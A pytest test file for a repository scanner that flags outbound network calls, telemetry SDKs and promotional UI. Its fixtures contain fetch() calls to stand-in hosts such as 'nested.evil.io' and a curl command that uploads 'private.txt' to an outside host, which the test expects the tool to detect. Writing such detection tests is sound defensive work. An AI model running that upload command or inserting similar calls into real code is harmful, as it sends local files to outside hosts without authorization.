import json

import pytest

from repo_airgap.analyzer.network_inventory import inventory
from repo_airgap.engine import scan
from repo_airgap.io import load_json
from repo_airgap.reporter import csv_report


def test_fixture_detects_external_sdk_promo_and_preserves_sources(target):
    before = {p.relative_to(target): p.read_bytes() for p in target.rglob("*") if p.is_file()}
    result = scan(target).to_dict()
    assert {p.relative_to(target): p.read_bytes() for p in target.rglob("*") if p.is_file()} == before
    candidates = result["candidates"]
    assert any(c["destination"] == "telemetry.evil-author.io" for c in candidates)
    assert any(c["destination"] == "api.openai.com" and c["decision"] == "NEEDS_REVIEW" for c in candidates)
    assert {"posthog-js", "@sentry/react"} <= {
        c["matched_content"] for c in candidates if c["category"] == "TELEMETRY_SDK"
    }
    assert any(c["category"] == "PROMO_UI" for c in candidates)
    assert any(c["category"] == "ENV_CONFIG" for c in candidates)
    assert all(c["file_path"] != "LICENSE" for c in candidates)
    assert all("fixture-not-a-real-credential" not in c["code_snippet"] for c in candidates)
    assert all("file_sha256" in c and c["context_start_line"] <= c["line_number"] for c in candidates)
    assert inventory(result)["targets"]


def test_gitignore_nested_negation_and_artifacts(target):
    (target / ".gitignore").write_text("ignored/\n*.generated.js\n", encoding="utf-8")
    ignored = target / "ignored"
    ignored.mkdir()
    (ignored / "call.py").write_text("fetch('https://ignored.evil.io')")
    folder = target / "nested"
    folder.mkdir()
    (folder / ".gitignore").write_text("*.js\n!keep.js\n", encoding="utf-8")
    for name in ("keep.js", "drop.js", "skip.generated.js"):
        (folder / name).write_text("fetch('https://nested.evil.io')", encoding="utf-8")
    state = target / ".airgap"
    state.mkdir()
    (state / "snapshot.py").write_text("fetch('https://state.evil.io')")
    paths = {c.file_path for c in scan(target).candidates}
    assert "nested/keep.js" in paths
    assert not paths & {
        "nested/drop.js",
        "nested/skip.generated.js",
        "ignored/call.py",
        ".airgap/snapshot.py",
    }


def test_network_boundaries(target):
    (target / "edges.py").write_text(
        """
# fetch('https://comment.evil.io')
url = "https://cdn.jsdelivr.net/library.js"
host = "bare.vendor.io"
fetch(endpoint)
socket.create_connection((host, 9000))
dns.resolve("unknown")
cmd = "curl --data @private.txt https://upload.vendor.io"
ip = "8.8.8.8"
private_ip = "192.168.1.9"
secret = "aAbBcCdD0123456789xxYYzz"
""",
        encoding="utf-8",
    )
    cs = [c for c in scan(target).candidates if c.file_path == "edges.py"]
    assert not any(c.destination == "comment.evil.io" for c in cs)
    assert any(c.destination == "bare.vendor.io" for c in cs)
    assert any(c.destination == "cdn.jsdelivr.net" and c.severity == "LOW" for c in cs)
    assert any(c.destination == "8.8.8.8" for c in cs)
    assert not any(c.destination == "192.168.1.9" for c in cs)
    assert {"sink_socket", "sink_dns", "sink_shell_upload", "sink_http_client"} <= {
        c.matched_rule for c in cs
    }
    assert any(c.destination == "dynamic" for c in cs)
    assert not any(c.category == "SECRET" for c in cs)


def test_imports_and_function_names_are_not_network_calls(target):
    path = target / "non_calls.py"
    path.write_text("import urllib.request\ndef blockedFetch(url):\n    return {}\n", encoding="utf-8")
    assert not any(
        c.file_path == "non_calls.py" and c.category == "NETWORK_SINK" for c in scan(target).candidates
    )


def test_rules_filters_ids_stable_and_no_secret_in_csv(target):
    all_results = scan(target).to_dict()
    filtered = scan(target, ignore_ids=["promo_keyword"]).to_dict()
    assert not any(c["matched_rule"] == "promo_keyword" for c in filtered["candidates"])
    assert filtered["suppressed_count"] > 0
    ids = {
        (c["file_path"], c["line_number"], c["matched_rule"], c["matched_content"]): c["id"]
        for c in all_results["candidates"]
    }
    assert all(
        ids[(c["file_path"], c["line_number"], c["matched_rule"], c["matched_content"])] == c["id"]
        for c in filtered["candidates"]
    )
    assert "fixture-not-a-real-credential" not in csv_report(all_results)


@pytest.mark.parametrize("sarif", [False, True])
def test_semgrep_local_import(target, tmp_path, sarif):
    location = "src/utils/telemetry.ts"
    data = {"results": [{"path": location, "start": {"line": 3}, "check_id": "network.test"}]}
    if sarif:
        data = {
            "runs": [
                {
                    "results": [
                        {
                            "ruleId": "network.test",
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": location},
                                        "region": {"startLine": 3},
                                    }
                                }
                            ],
                        }
                    ]
                }
            ]
        }
    external = tmp_path / "semgrep.json"
    external.write_text(json.dumps(data), encoding="utf-8")
    assert any(
        c.matched_rule == "semgrep:network.test" for c in scan(target, semgrep_report=external).candidates
    )


def test_rule_counts():
    from repo_airgap.engine import rules_directory

    rules = rules_directory()
    data = load_json(rules / "telemetry_domains.json")
    assert len(data["telemetry_domains"]) >= 30
    assert len(data["telemetry_packages"]) >= 30
    assert len(load_json(rules / "promo_keywords.json")["keywords"]) >= 30
